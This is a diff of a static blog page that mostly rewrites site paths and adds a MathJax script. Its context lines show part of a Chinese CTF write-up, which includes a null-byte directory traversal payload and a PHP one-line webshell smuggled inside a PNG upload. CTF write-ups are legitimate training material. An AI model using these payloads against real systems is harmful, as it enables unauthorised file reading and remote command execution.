@@ -18,23 +18,23 @@
 
 
 
-    <link rel="icon" href="/blog/favicon.ico">
+    <link rel="icon" href="/favicon.ico">
 
 
 
 
     <!-- stylesheets list from _config.yml -->
     
-    <link rel="stylesheet" href="/blog/css/style.css">
+    <link rel="stylesheet" href="/css/style.css">
     
 
 
 
     <!-- scripts list from _config.yml -->
     
-    <script src="/blog/js/script.js"></script>
+    <script src="/js/script.js"></script>
     
-    <script src="/blog/js/tocbot.min.js"></script>
+    <script src="/js/tocbot.min.js"></script>
     
 
 
@@ -47,7 +47,7 @@
   <!-- for theme: default is false -->
   <!-- for page: default is true -->
 
-<link rel="stylesheet" href="/blog/js/fancybox/jquery.fancybox.min.css">
+<link rel="stylesheet" href="/js/fancybox/jquery.fancybox.min.css">
 
 
 
@@ -62,16 +62,16 @@
         <header>
     <nav class="navbar">
         <div class="container">
-            <div class="navbar-header header-logo"><a href="/blog/">Home</a></div>
+            <div class="navbar-header header-logo"><a href="/">Home</a></div>
             <div class="menu navbar-right">
                 
-                    <a class="menu-item" href="/blog/archives">Posts</a>
+                    <a class="menu-item" href="/archives">Posts</a>
                 
-                    <a class="menu-item" href="/blog/category">Categories</a>
+                    <a class="menu-item" href="/category">Categories</a>
                 
-                    <a class="menu-item" href="/blog/tag">Tags</a>
+                    <a class="menu-item" href="/tag">Tags</a>
                 
-                    <a class="menu-item" href="/blog/about">About</a>
+                    <a class="menu-item" href="/about">About</a>
                 
                 <input id="switch_default" type="checkbox" class="switch_default">
                 <label for="switch_default" class="toggleBtn"></label>
@@ -84,19 +84,19 @@
         <div class="container">
             <div class="navbar-header">
                 <div>
-                    <a href="/blog/">Home</a><a id="mobile-toggle-theme">·&nbsp;Light</a>
+                    <a href="/">Home</a><a id="mobile-toggle-theme">·&nbsp;Light</a>
                 </div>
                 <div class="menu-toggle" onclick="mobileBtn()">&#9776; Menu</div>
             </div>
             <div class="menu" id="mobile-menu">
                 
-                    <a class="menu-item" href="/blog/archives">Posts</a>
+                    <a class="menu-item" href="/archives">Posts</a>
                 
-                    <a class="menu-item" href="/blog/category">Categories</a>
+                    <a class="menu-item" href="/category">Categories</a>
                 
-                    <a class="menu-item" href="/blog/tag">Tags</a>
+                    <a class="menu-item" href="/tag">Tags</a>
                 
-                    <a class="menu-item" href="/blog/about">About</a>
+                    <a class="menu-item" href="/about">About</a>
                 
             </div>
         </div>
@@ -206,7 +206,7 @@
                         <span class="post-category">
                     Category:
                             
-                                <a href="/blog/category/CTF/">CTF</a>
+                                <a href="/category/CTF/">CTF</a>
                             
                         </span>
                     
@@ -215,7 +215,7 @@
         </header>
 
         <div class="post-content">
-            <p><img src="/blog/2017/09/24/CCTF-%E9%87%8D%E5%BA%86%E7%BB%BF%E7%9B%9F%E6%9D%AF-%E6%AF%94%E8%B5%9BwriteUp/21-23-66.jpg">
+            <p><img src="/2017/09/24/CCTF-%E9%87%8D%E5%BA%86%E7%BB%BF%E7%9B%9F%E6%9D%AF-%E6%AF%94%E8%B5%9BwriteUp/21-23-66.jpg">
 <a id="more"></a></p>
 <h1 id="web1">WEB1</h1>
 <p>靶机只扫描到22的ssh端口 那么思路只有一个，只能爆破</p>
@@ -283,13 +283,13 @@ by修改表序列，是一个显式union注入 <strong>payload:</strong></p>
 <h1 id="web3">WEB3</h1>
 <h2 id="一阶段上传绕过">一阶段――上传绕过</h2>
 <p><strong>第一步扫描：</strong></p>
-<p><img src="/blog/2017/09/24/CCTF-%E9%87%8D%E5%BA%86%E7%BB%BF%E7%9B%9F%E6%9D%AF-%E6%AF%94%E8%B5%9BwriteUp/21-17-21.jpg"></p>
+<p><img src="/2017/09/24/CCTF-%E9%87%8D%E5%BA%86%E7%BB%BF%E7%9B%9F%E6%9D%AF-%E6%AF%94%E8%B5%9BwriteUp/21-17-21.jpg"></p>
 <p>发现开了很多端口 其中3389和80和8080是我们特别关注的
 进去80是一个IIS的建设中的页面，没啥挖掘的
 8080是一个Apache搭的应用下载市场 AWVS扫描发现有用的目录遍历漏洞</p>
-<p><img src="/blog/2017/09/24/CCTF-%E9%87%8D%E5%BA%86%E7%BB%BF%E7%9B%9F%E6%9D%AF-%E6%AF%94%E8%B5%9BwriteUp/21-21-28.jpg"></p>
+<p><img src="/2017/09/24/CCTF-%E9%87%8D%E5%BA%86%E7%BB%BF%E7%9B%9F%E6%9D%AF-%E6%AF%94%E8%B5%9BwriteUp/21-21-28.jpg"></p>
 <h5 id="有问题变量在模板参数tpl处">有问题变量在模板参数tpl处</h5>
-<p>被设置为<code>../../../../../../../windows/win.ini%00.jpg</code> <img src="/blog/2017/09/24/CCTF-%E9%87%8D%E5%BA%86%E7%BB%BF%E7%9B%9F%E6%9D%AF-%E6%AF%94%E8%B5%9BwriteUp/21-21-47.jpg"></p>
+<p>被设置为<code>../../../../../../../windows/win.ini%00.jpg</code> <img src="/2017/09/24/CCTF-%E9%87%8D%E5%BA%86%E7%BB%BF%E7%9B%9F%E6%9D%AF-%E6%AF%94%E8%B5%9BwriteUp/21-21-47.jpg"></p>
 <h3 id="科普">科普</h3>
 <p>还是科普一下 windows/win.ini，可以对照一下你C盘的C:.ini
 是一个系统的配置文件 %00是截断符，../回溯至win.ini后将读取win.ini%00.jpg
@@ -301,9 +301,9 @@ by修改表序列，是一个显式union注入 <strong>payload:</strong></p>
 <p>上传点过滤PHP后缀，截断以及该Content-Type无济于事，索性直接上传PNG文件，保留文件头和结束标记，在中间插入一句话
 大概是这样子的</p>
 <div class="sourceCode" id="cb2"><pre class="sourceCode php"><code class="sourceCode php"><span id="cb2-1"><a href="#cb2-1" aria-hidden="true" tabindex="-1"></a><span class="kw">&lt;?php</span> <span class="fu">system</span>(<span class="va">$_POST</span>[<span class="dv">1</span>])<span class="ot">;</span><span class="kw">echo</span> <span class="dv">1</span><span class="ot">;</span><span class="kw">?&gt;</span></span></code></pre></div>
-<p><img src="/blog/2017/09/24/CCTF-%E9%87%8D%E5%BA%86%E7%BB%BF%E7%9B%9F%E6%9D%AF-%E6%AF%94%E8%B5%9BwriteUp/21-37-40.jpg"></p>
+<p><img src="/2017/09/24/CCTF-%E9%87%8D%E5%BA%86%E7%BB%BF%E7%9B%9F%E6%9D%AF-%E6%AF%94%E8%B5%9BwriteUp/21-37-40.jpg"></p>
 <p>然后上传之后记录上传路径,将tpl改成静态png的路径。 大概是这样子的</p>
-<p><img src="/blog/2017/09/24/CCTF-%E9%87%8D%E5%BA%86%E7%BB%BF%E7%9B%9F%E6%9D%AF-%E6%AF%94%E8%B5%9BwriteUp/21-40-49.jpg"></p>
+<p><img src="/2017/09/24/CCTF-%E9%87%8D%E5%BA%86%E7%BB%BF%E7%9B%9F%E6%9D%AF-%E6%AF%94%E8%B5%9BwriteUp/21-40-49.jpg"></p>
 <p>毕竟环境已经关了，无法有更多详细的截图了，实在抱歉</p>
 <p>随后发现Png被解析成php了，并且提示,<code>system()</code>由于某些安全原因被禁用了</p>
 <p>随后就将一句话构造成这样</p>
@@ -383,7 +383,7 @@ DOS权限还是administrator的</p>
                 
                     <p class="copyright-item">
                         <span>Permalink:</span>
-                        <span><a href="https://testzero-wz.github.io/2017/09/24/CCTF-%E9%87%8D%E5%BA%86%E7%BB%BF%E7%9B%9F%E6%9D%AF-%E6%AF%94%E8%B5%9BwriteUp/">https://testzero-wz.github.io/2017/09/24/CCTF-%E9%87%8D%E5%BA%86%E7%BB%BF%E7%9B%9F%E6%9D%AF-%E6%AF%94%E8%B5%9BwriteUp/</a></span>
+                        <span><a href="https://www.testzero-wz.com/2017/09/24/CCTF-%E9%87%8D%E5%BA%86%E7%BB%BF%E7%9B%9F%E6%9D%AF-%E6%AF%94%E8%B5%9BwriteUp/">https://www.testzero-wz.com/2017/09/24/CCTF-%E9%87%8D%E5%BA%86%E7%BB%BF%E7%9B%9F%E6%9D%AF-%E6%AF%94%E8%B5%9BwriteUp/</a></span>
                     </p>
                 
                 
@@ -402,9 +402,9 @@ DOS权限还是administrator的</p>
                 <span class="tag">
                     
                     
-                        <a href="/blog/tag/CTF/"># CTF</a>
+                        <a href="/tag/CTF/"># CTF</a>
                     
-                        <a href="/blog/tag/WriteUp/"># WriteUp</a>
+                        <a href="/tag/WriteUp/"># WriteUp</a>
                     
                         
                 </span>
@@ -412,12 +412,12 @@ DOS权限还是administrator的</p>
             <div>
                 <a href="javascript:window.history.back();">back</a>
                 <span>· </span>
-                <a href="/blog/">home</a>
+                <a href="/">home</a>
             </div>
         </section>
         <section class="post-nav">
             
-                <a class="prev" rel="prev" href="/blog/2017/09/27/NSCTF-Web-WriteUp/">NSCTF-Web-WriteUp</a>
+                <a class="prev" rel="prev" href="/2017/09/27/NSCTF-Web-WriteUp/">NSCTF-Web-WriteUp</a>
             
             
         </section>
@@ -439,5 +439,22 @@ DOS权限还是administrator的</p>
 <script>hljs.highlightAll();</script>
 
     </div>
+<script type="text/x-mathjax-config">
+    MathJax.Hub.Config({
+        tex2jax: {
+            inlineMath: [ ["$","$"], ["\\(","\\)"] ],
+            skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code'],
+            processEscapes: true
+        }
+    });
+    MathJax.Hub.Queue(function() {
+        var all = MathJax.Hub.getAllJax();
+        for (var i = 0; i < all.length; ++i)
+            all[i].SourceElement().parentNode.className += ' has-jax';
+    });
+</script>
+<!-- <script src="https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.1/MathJax.js?config=TeX-MML-AM_CHTML"></script> -->
+
+<script src="https://cdnjs.loli.net/ajax/libs/mathjax/2.7.7/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script>
 </body>
 </html>
